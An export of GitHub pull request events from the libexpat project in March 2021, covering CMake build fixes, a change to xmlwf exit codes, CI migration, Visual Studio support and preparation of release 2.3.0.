442,ReviewRejected,2021-03-16 14:23:04,hartwork,fork_merge,"> I've changed the patch to move enable_language(CXX) just after the all the `option()` call. This approach should hopefully avoid any future issues.

@arichardson I like the idea and the comment you put in the code! :+1: You said ""move"" but it seems there are *two* calls to `enable_language(CXX)` now — am I missing something?","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/442#pullrequestreview-613307394""}"
442,Revise,2021-03-16 15:57:05,arichardson,fork_merge,"CMake: Only set CMAKE_CXX_FLAGS after enable_language(CXX)

Otherwise flags specified in a CMake cross-compilation toolchain (such as
CMAKE_CXX_FLAGS_INIT) will not be added. This could also affect native
builds but is much more likely to be noticed when cross-compiling due to
missing essential flags.","{""sha"": ""13d4c51a17dd8fde5cfa54c785e3e263fd0fb77a"", ""author"": {""name"": ""Alex Richardson"", ""email"": ""Alexander.Richardson@cl.cam.ac.uk"", ""date"": ""2021-03-16T00:39:12Z""}, ""committer"": {""name"": ""Alex Richardson"", ""email"": ""Alexander.Richardson@cl.cam.ac.uk"", ""date"": ""2021-03-16T15:57:05Z""}}"
442,IssueComment,2021-03-16 15:57:47,arichardson,fork_merge,"> > I've changed the patch to move enable_language(CXX) just after the all the `option()` call. This approach should hopefully avoid any future issues.
> 
> @arichardson I like the idea and the comment you put in the code! ???? You said ""move"" but it seems there are _two_ calls to `enable_language(CXX)` now — am I missing something?

Ah indeed, while cleaning up my commit I accidentally dropped the second chunk. Should be fixed now.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/800387234"", ""author_association"": ""CONTRIBUTOR""}"
442,ReviewRequested,2021-03-16 15:58:02,arichardson,fork_merge,,"{""requested_reviewer"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}, ""requested_team"": null}"
442,ReviewApproved,2021-03-16 16:12:00,hartwork,fork_merge,Thank you! :pray: ,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/442#pullrequestreview-613447172""}"
442,MergePR,2021-03-16 17:17:16,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4465901448"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/13d4c51a17dd8fde5cfa54c785e3e263fd0fb77a""}"
442,DeleteBranch,2021-03-16 17:19:32,arichardson,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4465913605"", ""commit_url"": null}"
442,IssueCommentSupplement,2021-03-18 18:57:31,hartwork,fork_merge,"PS: @arichardson I noticed now that https://github.com/uriparser/uriparser has the same problem. If you want to make a pull request with the same fix once more, please be invited to. I can easily do it myself after your work here but maybe the commit recording you as a contributor to uriparser technically/formally is of interest to you. If not, no worries, just an idea.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/802208332"", ""author_association"": ""MEMBER""}"
442,CrossReferenced,2021-03-23 13:46:24,hartwork,fork_merge,CMake: Only set CMAKE_CXX_FLAGS after enable_language(CXX),"{""reference"": {""url"": ""https://api.github.com/repos/uriparser/uriparser/issues/110"", ""is_pull_request"": true}}"
443,SubmitCommit,2021-03-16 17:27:32,hartwork,unfork_merge,Changes: Fix inconsistent double blank line,"{""sha"": ""734698ba6ab3305cddc286c37bd7ac3beba38823"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-16T17:27:32Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-16T17:27:32Z""}}"
443,SubmitCommit,2021-03-16 17:34:06,hartwork,unfork_merge,Bump version infro from 7:12:6 to 8:0:7,"{""sha"": ""1955a4092e07620b83a134d257b0b7d488aaee70"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-16T17:34:06Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-16T17:34:06Z""}}"
443,OpenPR,2021-03-16 17:36:45,hartwork,unfork_merge,,
443,RenameTitle,2021-03-16 23:49:29,hartwork,unfork_merge,,"{""rename"": {""from"": ""Bump version info"", ""to"": ""Bump shared library version info for next release""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4467410836""}"
443,MergePR,2021-03-16 23:49:36,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4467411072"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/90c36ffffe738fb4efd240cba11478d18d50d00b""}"
443,DeleteBranch,2021-03-17 01:12:51,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4467598877"", ""commit_url"": null}"
444,OpenPR,2021-03-19 20:58:37,hartwork,unfork_merge,,
444,Labeled,2021-03-19 20:59:55,hartwork,unfork_merge,bug,
444,CrossReferenced,2021-03-19 21:10:56,hartwork,unfork_merge,Release Expat 2.3.0,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/445"", ""is_pull_request"": false}}"
444,ReviewComment,2021-03-19 21:11:15,timbray,unfork_merge,"Um, I don't see a change to xmlwf.c to implement the new error code?","{""author_association"": ""CONTRIBUTOR"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/444#pullrequestreview-616793595""}"
444,ReviewComment,2021-03-19 21:23:55,hartwork,unfork_merge,"> Um, I don't see a change to xmlwf.c to implement the new error code?

True, some changes didn't make it into the commit by mistake. Fixed with the upcoming push. Thanks!","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/444#pullrequestreview-616799829""}"
444,ReviewApproved,2021-03-19 21:28:55,timbray,unfork_merge,I confess I'm a little worried about someone having xmlwf in production in a script that relies on the exit code.,"{""author_association"": ""CONTRIBUTOR"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/444#pullrequestreview-616805111""}"
444,IssueComment,2021-03-19 21:35:17,hartwork,unfork_merge,"> I confess I'm a little worried about someone having xmlwf in production in a script that relies on the exit code.

That's why I kept the malformed input constant at 2 and moved the invalid usage case to 4. If the script fails to invoke xmlwf correctly, probably the script needs fixing anyway, no?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/803147101"", ""author_association"": ""MEMBER""}"
444,IssueComment,2021-03-19 21:38:19,hartwork,unfork_merge,PS: Plus exit status 2 was documented up to 2.2.10 to signal malformed input files and nothing else.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/803148581"", ""author_association"": ""MEMBER""}"
444,IssueComment,2021-03-19 21:41:13,freddrake,unfork_merge,"Just noticed all this.

Exit status 2 is conventionally used to report invalid command-line invocations in the Unix world.

I don't recall the history of the usage specifically in **xmlwf**, which is what really matters here.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/803149830"", ""author_association"": ""MEMBER""}"
444,IssueComment,2021-03-19 21:43:19,freddrake,unfork_merge,"That said, most users (including scripts) don't check the exact exit status, but only for success or failure.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/803150724"", ""author_association"": ""MEMBER""}"
444,IssueComment,2021-03-19 22:54:29,hartwork,unfork_merge,"@freddrake @timbray I made the pull request with the understanding that the current situation is broken and would get better with this change rather than worse. I moved that half of exist status 2 that seemed movable without considerable damage. Are you on board with a merge of the current diff or would you like to discuss other options more, first?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/803178428"", ""author_association"": ""MEMBER""}"
444,IssueComment,2021-03-20 01:51:24,freddrake,unfork_merge,"@hartwork: I've no objection to continuing with the current solution.  Once the exit codes became conflated, there's no way to really ""win"" on this.  Using the documentation as the guide to how this should be changed is as good as it's going to get.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/803222797"", ""author_association"": ""MEMBER""}"
444,Revise,2021-03-20 17:20:09,hartwork,unfork_merge,xmlwf.xml: Fix numerus for recent advent of -k,"{""sha"": ""05f54b6c5e83a1970eb80688b2eb659c5b453c02"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-19T20:54:37Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-20T17:20:09Z""}}"
444,Revise,2021-03-20 17:20:09,hartwork,unfork_merge,xmlwf: Split off exit status 4 for invalid argument invokation,"{""sha"": ""a6f3f2a3a27f0ea23f89847bd7d446088ab08ce1"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-19T20:51:16Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-20T17:20:09Z""}}"
444,Revise,2021-03-20 17:20:09,hartwork,unfork_merge,Changes: Fix inconsistent indentation,"{""sha"": ""689cb6527fdd5f93eea5ee311e3a73e986e5bce4"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-19T20:48:19Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-20T17:20:09Z""}}"
444,IssueComment,2021-03-20 18:50:53,hartwork,unfork_merge,@timbray any concerns from your side with going forward and merge?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/803444805"", ""author_association"": ""MEMBER""}"
444,IssueComment,2021-03-20 19:05:49,timbray,unfork_merge,"When we were discussing this, you did mention the case where -k is specified and then there's both an output-file-open and a not-well-formed file error, then both error codes 2 and 3 apply, but the value returned would depend on which happened last. You had mentioned the possibility of using 5 in this case. Now, this seems like a VERY unlikely scenario, but I thought I should mention it since you discussed it.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/803446960"", ""author_association"": ""CONTRIBUTOR""}"
444,IssueComment,2021-03-20 19:13:51,hartwork,unfork_merge,"@timbray we can definitely discuss if we want ""first error wins"", ""last error wins"" or some form of ""collect errors"" semantics with `-k` but I think that topic is (related but) orthogonal to what we have here. Let's decide about the current ambiguity of status 2 first. What do you think?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/803447953"", ""author_association"": ""MEMBER""}"
444,IssueComment,2021-03-20 20:14:24,timbray,unfork_merge,"You're right, it's unambiguously better to sort out the 2 and 4 codes now. I'm in favor of pushing.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/803457116"", ""author_association"": ""CONTRIBUTOR""}"
444,IssueComment,2021-03-20 20:32:36,hartwork,unfork_merge,Okay great — thanks to the two of you! :pray:,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/803459263"", ""author_association"": ""MEMBER""}"
444,MergePR,2021-03-20 20:32:59,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4485987210"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/13e8bc246b11b220f65e584c968d5e0cfeff2ac3""}"
444,DeleteBranch,2021-03-20 20:34:11,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4485988095"", ""commit_url"": null}"
446,SubmitCommit,2021-03-20 13:06:49,hartwork,unfork_merge,Quick-port Linux jobs from Travis CI to GitHub Actions,"{""sha"": ""c01e51126d2d547ab88ea23590c411e21aa4898f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-20T01:42:22Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-20T13:06:49Z""}}"
446,Labeled,2021-03-20 13:19:13,hartwork,unfork_merge,enhancement,
446,OpenPR,2021-03-20 13:19:13,hartwork,unfork_merge,,
446,CrossReferenced,2021-03-20 13:34:28,hartwork,unfork_merge,Release Expat 2.3.0,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/445"", ""is_pull_request"": false}}"
446,MergePR,2021-03-20 14:47:06,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4485678356"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/3bc4eac843e1971234ea5a2aa4abdd50da0a5ec8""}"
446,DeleteBranch,2021-03-20 14:47:40,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4485678889"", ""commit_url"": null}"
447,SubmitCommit,2021-03-20 14:38:49,hartwork,unfork_merge,Windows: Drop support for Visual Studio <=14.0/2015,"{""sha"": ""dd26478455ca91c13e40eed6b26f10dd7efc33fc"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-20T14:33:49Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-20T14:38:49Z""}}"
447,Labeled,2021-03-20 14:40:53,hartwork,unfork_merge,enhancement,
447,Labeled,2021-03-20 14:40:53,hartwork,unfork_merge,compilation,
447,Labeled,2021-03-20 14:40:53,hartwork,unfork_merge,windows,
447,OpenPR,2021-03-20 14:40:53,hartwork,unfork_merge,,
447,CrossReferenced,2021-03-20 14:41:47,hartwork,unfork_merge,Release Expat 2.3.0,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/445"", ""is_pull_request"": false}}"
447,MergePR,2021-03-20 16:10:10,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4485757532"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/c48bb1eb35c1414b8a2eec5e85723e32c7a94c9f""}"
447,DeleteBranch,2021-03-20 16:10:57,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4485758215"", ""commit_url"": null}"
447,ReviewCommentSupplement,2021-03-25 19:06:30,SpaceIm,unfork_merge,,"{""author_association"": ""NONE"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/447#pullrequestreview-621486310""}"
447,CrossReferenced,2021-03-25 20:49:42,hartwork,unfork_merge,[2.3.0] Why CMakeLists prevents to use Visual Studio 2013 & 2015?,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/454"", ""is_pull_request"": false}}"
447,CrossReferenced,2021-03-26 15:25:34,hartwork,unfork_merge,CMake: Be less rejective towards unsupported MSVC compilers for Conan (#454),"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/455"", ""is_pull_request"": true}}"
448,Labeled,2021-03-21 14:26:09,hartwork,unfork_merge,releasing,
448,OpenPR,2021-03-21 14:26:09,hartwork,unfork_merge,,
448,Assigned,2021-03-21 14:26:10,hartwork,unfork_merge,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
448,ReviewComment,2021-03-21 22:32:06,abdukh,unfork_merge,Vi,"{""author_association"": ""NONE"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/448#pullrequestreview-617069611""}"
448,RenameTitle,2021-03-22 23:03:43,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] Prepare next release (#445)"", ""to"": ""[W.I.P.] Prepare release 2.3.0 (part of #445)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4492917961""}"
448,Revise,2021-03-22 23:54:35,hartwork,unfork_merge,Changes: Improve documentation of #444,"{""sha"": ""1361370223a68c1189e480cf445a7348f8e580a9"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T23:54:06Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T23:54:35Z""}}"
448,Revise,2021-03-22 23:54:35,hartwork,unfork_merge,"Changes: Document #425, #426, #434, #435, #436, #437, #441, #443, #446 (#445)","{""sha"": ""7991830172e8d4007201c6b461f900a14c245ade"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-21T13:51:23Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T23:54:35Z""}}"
448,Revise,2021-03-24 19:09:54,hartwork,unfork_merge,README.md: Fix list syntax for some markdown interpreters,"{""sha"": ""c992ac0fd7938b2e68eeafc427d735f518fc4804"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T17:16:33Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T19:09:54Z""}}"
448,Revise,2021-03-24 19:10:02,hartwork,unfork_merge,README.md: Add more structure,"{""sha"": ""8f70f8c87fb436144a1c9bf4d735db20514dad45"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T17:27:24Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T19:10:02Z""}}"
448,Revise,2021-03-24 20:05:04,hartwork,unfork_merge,Changes: Set release date for version 2.3.0,"{""sha"": ""7d375b1bd92bdc4d6519938664d861dae039532d"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T18:53:20Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T20:05:04Z""}}"
448,Revise,2021-03-24 20:05:04,hartwork,unfork_merge,"lib: Fix references to version 2.2.11 to be about 2.3.0, instead","{""sha"": ""800c4d14e2e9db00b386bfd2fcde688fc377d3a2"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T18:48:56Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T20:05:04Z""}}"
448,Revise,2021-03-24 20:05:04,hartwork,unfork_merge,Bump version from 2.2.10 to 2.3.0,"{""sha"": ""3417b3e098f1426f736ccacd9bc50aa8f5b7e35c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T18:26:06Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T20:05:04Z""}}"
448,Revise,2021-03-24 20:05:04,hartwork,unfork_merge,README.md: Fix a SourceForge link leftover regarding Windows binaries (#1),"{""sha"": ""4bd4bac2682d913515c9dd638592582ccfca285a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T17:49:06Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T20:05:04Z""}}"
448,Revise,2021-03-24 20:05:04,hartwork,unfork_merge,README.md: Document use of libexpat from a CMake-based project,"{""sha"": ""f546f0658b168ba21f69c61d62c9da595e537e90"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T17:37:53Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T20:05:04Z""}}"
448,Revise,2021-03-24 20:05:04,hartwork,unfork_merge,"README.md: Replace a ""will"" by a ""may"" to be more precise","{""sha"": ""d0faa1ec149527ac0da7e39d3531d554947ea506"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T17:52:22Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T20:05:04Z""}}"
448,Revise,2021-03-24 20:05:04,hartwork,unfork_merge,README.md: Replace Travis CI badge with GitHub Actions badge,"{""sha"": ""1ec7950e46da1ff0b224910718414e2f8ab0d3ac"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T17:44:27Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-24T20:05:04Z""}}"
448,RenameTitle,2021-03-24 20:31:58,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] Prepare release 2.3.0 (part of #445)"", ""to"": ""Prepare release 2.3.0 (part of #445)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4504239668""}"
448,MergePR,2021-03-25 00:49:30,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4505150286"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/7d375b1bd92bdc4d6519938664d861dae039532d""}"
448,DeleteBranch,2021-03-25 00:57:55,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4505167690"", ""commit_url"": null}"
450,Labeled,2021-03-22 17:24:10,hartwork,unfork_merge,enhancement,
450,Labeled,2021-03-22 17:24:10,hartwork,unfork_merge,compilation,
450,OpenPR,2021-03-22 17:24:10,hartwork,unfork_merge,,
450,Revise,2021-03-22 17:28:11,hartwork,unfork_merge,"configure.ac: Apply partial autoupdate-2.71

Addressed:
warning: The macro `AC_CONFIG_HEADER' is obsolete.

Not addressed yet:
warning: AC_PROG_CC_C99 is obsolete; use AC_PROG_CC","{""sha"": ""fd9a7d649e5d6f889276a717149d54b49cbcb0b4"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T17:17:30Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T17:28:11Z""}}"
450,MergePR,2021-03-22 18:36:18,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4491901876"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/16315c6b5b79a08e9d04cb2817dc5e5e85588e08""}"
450,DeleteBranch,2021-03-22 18:55:55,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4491988676"", ""commit_url"": null}"
451,SubmitCommit,2021-03-22 21:30:00,hartwork,unfork_merge,Autotools: Install CMake files,"{""sha"": ""b50ff5adaaf5576f6485cc2f6351b7604d647992"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T15:20:26Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T21:30:00Z""}}"
451,SubmitCommit,2021-03-22 21:40:54,hartwork,unfork_merge,Actions: Ensure that GNU Autotools install identical CMake files,"{""sha"": ""e9026b19c4ff653b3ed61057b6ac58d8ade187ca"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T21:22:02Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T21:40:54Z""}}"
451,Labeled,2021-03-22 21:41:40,hartwork,unfork_merge,enhancement,
451,OpenPR,2021-03-22 21:41:40,hartwork,unfork_merge,,
451,MergePR,2021-03-22 22:43:14,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4492865010"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/8574d61f780079da86178d42e24d979551285f03""}"
451,DeleteBranch,2021-03-22 22:43:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4492866504"", ""commit_url"": null}"
452,SubmitCommit,2021-03-22 23:01:03,hartwork,unfork_merge,Actions: Make CI fail on non-triple version from configure.ac,"{""sha"": ""39f304d99f4b396b064b263cfee4af024ffc1b2e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T22:46:04Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T23:01:03Z""}}"
452,SubmitCommit,2021-03-22 23:01:03,hartwork,unfork_merge,"configure.ac: Fix use of M4 macro ""expat_version""

Regression introduced in fd9a7d649e5d6f889276a717149d54b49cbcb0b4
as part of pull request #450","{""sha"": ""30ec88b3512dcfef22cbba664904309eefe6562b"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T22:49:59Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-22T23:01:03Z""}}"
452,Labeled,2021-03-22 23:02:25,hartwork,unfork_merge,bug,
452,Labeled,2021-03-22 23:02:25,hartwork,unfork_merge,compilation,
452,OpenPR,2021-03-22 23:02:25,hartwork,unfork_merge,,
452,MergePR,2021-03-22 23:49:17,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4493047785"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f840ff1a2a5a679da575a2a0e8c96b6c59198b6d""}"
452,DeleteBranch,2021-03-22 23:49:38,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4493048832"", ""commit_url"": null}"
453,SubmitCommit,2021-03-25 17:18:08,nschonni,fork_merge,typo: Buildung -> Building,"{""sha"": ""8fdc4c6c5fda3e60145beefae3198ef84c7c479f"", ""author"": {""name"": ""Nick Schonning"", ""email"": ""nschonni@gmail.com"", ""date"": ""2021-03-25T17:18:08Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2021-03-25T17:18:08Z""}}"
453,OpenPR,2021-03-25 17:18:20,nschonni,fork_merge,,
453,ReviewApproved,2021-03-25 17:19:33,hartwork,fork_merge,@nschonni thank you!,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/453#pullrequestreview-621386308""}"
453,Labeled,2021-03-25 17:19:53,hartwork,fork_merge,bug,
453,MergePR,2021-03-25 18:11:19,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4509428680"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/a29faca3661660557ce66743d075e171ed367441""}"
453,DeleteBranch,2021-03-25 18:29:04,nschonni,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4509512083"", ""commit_url"": null}"
455,Labeled,2021-03-26 15:25:34,hartwork,unfork_merge,bug,
455,OpenPR,2021-03-26 15:25:34,hartwork,unfork_merge,,
455,Labeled,2021-03-26 15:25:34,hartwork,unfork_merge,compilation,
455,CrossReferenced,2021-03-26 15:26:19,hartwork,unfork_merge,[2.3.0] Why CMakeLists prevents to use Visual Studio 2013 & 2015?,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/454"", ""is_pull_request"": false}}"
455,ReviewComment,2021-03-26 15:42:50,tbeu,unfork_merge,"I would not like to see such a big fat screaming warning. If it compiles, it is good enough for me.

Btw, I modified expat 2.3.0 in my environment to work again with VS2010 yesterday. It is just the one include of <stdbool.h> which prevents successful compilation in VS2010.

I'd actually prefer to revert dd26478455ca91c13e40eed6b26f10dd7efc33fc again. Did not know that the required version was increased after my commit a86a16e2c59183cc39a1123fdd973e283eaf6e91.","{""author_association"": ""CONTRIBUTOR"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/455#pullrequestreview-622284715""}"
455,IssueComment,2021-03-26 16:20:45,hartwork,unfork_merge,"> I would not like to see such a big fat screaming warning.

Are you talking about the exclamation marks? To make something visable in a long log where you want people to take action, I think that bit of uppercase is totally fine, it could be a lot louder. It's in Expat interest to have all users on a supported compiler, right?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/808345371"", ""author_association"": ""MEMBER""}"
